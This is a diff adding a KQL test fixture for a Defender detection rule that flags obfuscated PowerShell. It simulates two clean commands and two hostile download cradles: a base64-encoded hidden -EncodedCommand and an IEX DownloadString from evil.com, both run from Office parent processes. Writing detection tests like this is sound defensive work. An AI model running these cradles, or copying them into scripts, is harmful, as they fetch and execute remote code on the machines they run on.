@@ -1,0 +1,39 @@
+// === Test Case: PowerShell Obfuscation Detection ===
+// Simulates: 4 PowerShell commands — 2 obfuscated (malicious), 2 clean
+//
+// Expected: Rule should fire on the 2 obfuscated commands (base64 + IEX)
+// and score them >= 2. Clean commands should not trigger.
+// Query expects: DeviceProcessEvents (Microsoft Defender for Endpoint)
+
+let TestDeviceProcessEvents = datatable(
+    TimeGenerated: datetime,
+    FileName: string,
+    ProcessCommandLine: string,
+    DeviceName: string,
+    AccountName: string,
+    InitiatingProcessParentFileName: string,
+    InitiatingProcessCommandLine: string
+)
+[
+    // Malicious: Base64-encoded PowerShell download cradle
+    datetime(2025-07-24 05:00:00), "powershell.exe",
+    'powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==',
+    "WS-001", "jsmith", "WINWORD.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+
+    // Malicious: IEX download cradle
+    datetime(2025-07-24 05:05:00), "powershell.exe",
+    'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden IEX(New-Object Net.WebClient).DownloadString("http://evil.com/ps.ps1")',
+    "WS-002", "akim", "OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+
+    // Clean: Normal PowerShell script (should NOT fire)
+    datetime(2025-07-24 06:00:00), "powershell.exe",
+    'powershell.exe -File "C:\\Scripts\\get-ad-users.ps1" -SearchBase "OU=Sales,DC=contoso,DC=com"',
+    "WS-003", "bwilson", "explorer.exe", "C:\\Windows\\explorer.exe",
+
+    // Clean: Normal admin command (should NOT fire)
+    datetime(2025-07-24 07:00:00), "powershell.exe",
+    'powershell.exe Get-Service BITS | Where-Object {$_.Status -eq "Running"} | Restart-Service',
+    "WS-004", "admin", "explorer.exe", "C:\\Windows\\explorer.exe",
+];
+
+TestDeviceProcessEvents
